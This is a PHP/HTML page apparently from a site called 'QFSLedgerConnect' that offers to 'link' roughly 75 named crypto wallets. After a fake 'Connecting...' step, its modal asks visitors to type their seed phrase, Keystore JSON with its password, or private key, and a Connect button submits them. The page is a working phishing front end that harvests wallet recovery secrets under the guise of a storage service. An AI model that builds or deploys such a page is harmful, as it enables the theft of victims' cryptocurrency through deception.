<?php require "php/general.php"; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <?php 
        use Src\Config\Head; 
        Head::tags();
    ?>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="../src/assets/css/general.css">
    <link rel="stylesheet" href="../assets/css/line-awesome.min.css">
    <title>QFSLedgerConnect - Storage for your wallets</title>
</head>
<body class="data-dark-body">
    <?php include "src/template/quick-notice.php"; ?>
    <div class="section">
        <div class="wrapper d-flex align-items-stretch">
            <?php include "src/template/sb/sidebar.php"; ?>

            <section class="p-4 p-md-5 pt-5">
                <?php include "src/template/head.php"; ?>
                <main>

                    <section class="mt-5 content" data-bs-theme="dark">
                        <header>
                            <p class="title">Copy Professionals</p>
                        </header>
                        <!-- <h3>Link Wallets</h3>
                        <p>Link your wallets all in one place</p> -->
                        <div class="row justify-content-around align-items-center mt-3 profile-form" data-parent="body">

                            <div class="modalWallet data-dark" id="modalWallet" data-parent="body">
                                <div class="close" onclick="closeModal(this)"></div>
                                <div class="sub-modal">
                                    <p onclick="closeModal(this)" class="closeModal">Close</p>

                                    <div id="message">

                                    </div>
                                    <div class="connectMethod">
                                        <div class="modal-border">
                                            <span>Connecting...</span>
                                            &emsp;
                                            <span class="manual" onclick="connectManually(this)">Connect manually</span>
                                        </div>
                                        <hr>
                                        <div class="modal-border modal-border-2 mx-auto row justify-content-even align-items-center">
                                            <div class="col-7">
                                                <p class="walletName"></p>
                                                <span>Easy you use browser extension</span>
                                            </div>
                                            <div class="col-5">
                                                <img src="" class="walletLogo" alt="">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="connectForm col-12">
                                        <div class="justify-content-center text-center align-items-center walletType row col-12">
                                            <div class="walletName" id="walletName"></div>
                                            &emsp;
                                            <div class=""><img class="walletLogo" src="" alt=""></div>
                                        </div>
                                        <div class="connectHeader justify-content-around row text-center mt-3 col-12 mx-auto">
                                            <div class="col-4">
                                                <p class="active">Seed Phrase</p>
                                            </div>
                                            <div class="col-4">
                                                <p>Keystore JSON</p>
                                            </div>
                                            <div class="col-4">
                                                <p>Private Key</p>
                                            </div>
                                            <div class="col-4 mt-2">
                                                <p>Hardware Key</p>
                                            </div>
                                        </div>

                                        <div class="col-12 text-center">
                                            <textarea name="seed" id="seed" cols="30" rows="5" class="form-inp" placeholder="Enter the seed phrase"></textarea>
                                            <br>
                                            <input type="text" class="form-inp" placeholder="Wallet Password" id="walletPassword">
                                            <br>
                                            <p id="walletInfo">
                                                Typically 12 (sometimes 24) words separated by single spaces or a key in HEX format
                                            </p>
                                            <br>
                                            <button class="btn" onclick="submit(this, 'walletConnect')">Connect</button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <section class="mt-3 col-11 mx-auto col-lg-9">
                                <div>
                                    <headerx>
                                        <h5>Connect Wallets</h5>
                                    </header>
                                    <div class="sub-section">
                                        <p>Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
                                    </div>
                                    <div class="row justify-content-around align-items-center forms" id="walletsHolder">
                                        <!-- Wallets would be inserted here from javascript -->
                                    </div>
                                </div>
                            </section>
                        </div>
                    </section>
                </main>
            </section>
        </div>
    </div>
</body>
<?php include "src/template/success.php"; ?>
<script src="../src/assets/js/main.js"></script>
<script src="../src/assets/js/general.js"></script>
<script src="../src/assets/js/chart.js"></script>
<script>
    let ConnectHeader = document.querySelector(".connectHeader")
    let headerSection = ConnectHeader.querySelectorAll("p")
    let modalWallet = document.getElementById("modalWallet")

    window.addEventListener("load", () => {
        let wallets = 
        {
            "Atomic": "../src/assets/wallets/atomic.png",
            "Morixwallet": "../src/assets/wallets/morixwallet.png",
            "Coinbase": "../src/assets/wallets/coinbase.png",
            "Cool Wallet": "../src/assets/wallets/coolwallet.png",
            "Fetch": "../src/assets/wallets/fetch.jpeg",
            "Ledger": "../src/assets/wallets/ledger.png",
            "Iconex": "../src/assets/wallets/iconex.png",
            "Keyringpro": "../src/assets/wallets/keyringpro.png",
            "Bitkeep": "../src/assets/wallets/bitkeep.png",
            "Blockchain": "../src/assets/wallets/blockchain.png",
            "Dokwallet": "../src/assets/wallets/dokwallet.png",
            "Eidoo": "../src/assets/wallets/eidoo.png",
            "Alpha Wallet": "../src/assets/wallets/alphawallet.jpeg",
            "Mykey": "../src/assets/wallets/mykey.png",
            "Graph Protocol": "../src/assets/wallets/graphprotocol.jpeg",
            "Peakdefi": "../src/assets/wallets/peakdefi.png",
            "Sparkpoint": "../src/assets/wallets/sparkpoint.png",
            "Alice": "../src/assets/wallets/alice.png",
            "Cybavo": "../src/assets/wallets/cybavo.png",
            "Equal": "../src/assets/wallets/equal.jpeg",
            "Keplr": "../src/assets/wallets/keplr.png",
            "Spatium": "../src/assets/wallets/spatium.jpeg",
            "Walleth": "../src/assets/wallets/walleth.png",
            "Trust Vault": "../src/assets/wallets/trustvault.png",
            "Bridgewallet": "../src/assets/wallets/bridgewallet.png",
            "Rainbow": "../src/assets/wallets/rainbow.png",
            "Onto": "../src/assets/wallets/onto.png",
            "Math": "../src/assets/wallets/math.png",
            "Vision": "../src/assets/wallets/vision.png",
            "Phantom": "../src/assets/wallets/phantom.png",
            "Torus": "../src/assets/wallets/torus.jpeg",
            "Atwallet": "../src/assets/wallets/atwallet.png",
            "Infinity": "../src/assets/wallets/infinity.png",
            "Ownbit": "../src/assets/wallets/ownbit.png",
            "Loopring": "../src/assets/wallets/loopring.jpeg",
            "Trust": "../src/assets/wallets/trust.svg",
            "Midaswallet": "../src/assets/wallets/midaswallet.png",
            "Ellipal": "../src/assets/wallets/ellipal.png",
            "Tokenpocket": "../src/assets/wallets/tokenpocket.png",
            "Crypto": "../src/assets/wallets/crypto.png",
            "Coinomi": "../src/assets/wallets/coinomi.jpeg",
            "Meetone": "../src/assets/wallets/meetone.jpeg",
            "Metamask": "../src/assets/wallets/metamask.svg",
            "Tokenary": "../src/assets/wallets/tokenary.png",
            "Kardiachain": "../src/assets/wallets/kardiachain.png",
            "Wazirx": "../src/assets/wallets/wazirx.png",
            "Lobstr": "../src/assets/wallets/lobstr.png",
            "Anchor": "../src/assets/wallets/anchor.png",
            "Coin98": "../src/assets/wallets/coin98.png",
            "Unstoppable": "../src/assets/wallets/unstoppable.png",
            "Huobi": "../src/assets/wallets/huobi.jpeg",
            "Cosmo Station": "../src/assets/wallets/cosmostation.png",
            "Harmony": "../src/assets/wallets/harmony.png",
            "Argent": "../src/assets/wallets/argent.svg",
            "Gnosis": "../src/assets/wallets/gnosis.jpeg",
            "Aktionariat": "../src/assets/wallets/aktionariat.png",
            "Maiar": "../src/assets/wallets/maiar.png",
            "Pillar": "../src/assets/wallets/pillar.png",
            "Safepal": "../src/assets/wallets/safepal.png",
            "Infinito": "../src/assets/wallets/infinito.png",
            "Nash": "../src/assets/wallets/nash.jpeg",
            "Zelcore": "../src/assets/wallets/zelcore.png",
            "Authereum": "../src/assets/wallets/authereum.png",
            "XDC": "../src/assets/wallets/xdc.png",
            "Dcent": "../src/assets/wallets/dcent.png",
            "Wallet Connect": "../src/assets/wallets/walletconnect.jpeg",
            "Swft": "../src/assets/wallets/swft.png",
            "Easypocket": "../src/assets/wallets/easypocket.jpeg",
            "Binance": "../src/assets/wallets/binance.svg",
            "Viawallet": "../src/assets/wallets/viawallet.png",
            "Exodus": "../src/assets/wallets/exodus.png",
            "Bitpay": "../src/assets/wallets/bitpay.jpeg",
            "Grid Plus": "../src/assets/wallets/gridplus.png",
            "Walletio": "../src/assets/wallets/walletio.png"
        }
        let walletsHolder = document.getElementById("walletsHolder")
        let walletKey = Object.keys(wallets)
        walletKey.forEach(elem => {
            walletsHolder.insertAdjacentHTML("beforeend", walletModalBox(wallets[elem], elem))
            /*let ind = Math.floor(Math.random() * walletKey.length)
            let newKey = walletKey[ind]
            holder[newKey] = wallets[newKey]
            // remove it from object
            delete wallets[newKey]
            walletKey = Object.keys(wallets)*/
        })

    })

    function selectWallet(self) {
        // Fecth the image and name of wallet
        let image = self.querySelector("img").getAttribute("src")
        let name = self.querySelector("p").innerText

        modalWallet.style.display = "block"

        Array.from(document.querySelectorAll(".walletName")).forEach((elem, ind) => {
            elem.innerText = name

            document.querySelectorAll(".walletLogo")[ind].src = image
        })
    }

    function connectManually(self) {
        self.closest(".connectMethod").style.display = "none"
        document.querySelector(".connectForm").style.display = "block"
    }

    Array.from(headerSection).forEach(elem => {
        elem.addEventListener("click", () => {
            ConnectHeader.querySelector(".active").classList.remove("active")
            elem.classList.add("active")

            seed.setAttribute("placeholder", `Enter your ${elem.innerText}`)
            let username = document.getElementById("walletPassword")
            let walletInfo = document.getElementById("walletInfo")

            if(elem.innerText == "Keystore JSON") {
                username.style.display = "block"
                walletInfo.innerText = "Several lines of text beginning with '{...}' plus the password you used to encrypt it."
            }else{
                username.style.display = "none"
                walletInfo.innerText = "Typically 12 (sometimes 24) words separated by single spaces"
            }
        })
    })

    function closeModal(self) {
        modalWallet.style.display = "none"

        document.getElementById("seed").value = ""
        document.getElementById("walletPassword").value = ""

        document.querySelector(".connectForm").style.display = "none"
        document.querySelector(".connectMethod").style.display = "block"

        Array.from(document.querySelectorAll(".walletName")).forEach((elem, ind) => {
            elem.innerText = ""

            document.querySelectorAll(".walletLogo")[ind].src = ""
        })
    }

    function walletModalBox(path, name) {
        return `
            <div class="col-4 col-lg-3 walletBox data-dark-top">
                <div onclick="selectWallet(this)" class="col-12">
                    <img src="${path}" alt="">
                    <br>
                    <p class="mt-2">${name}</p>
                </div>
            </div>
        `
    }
    
</script>
</html>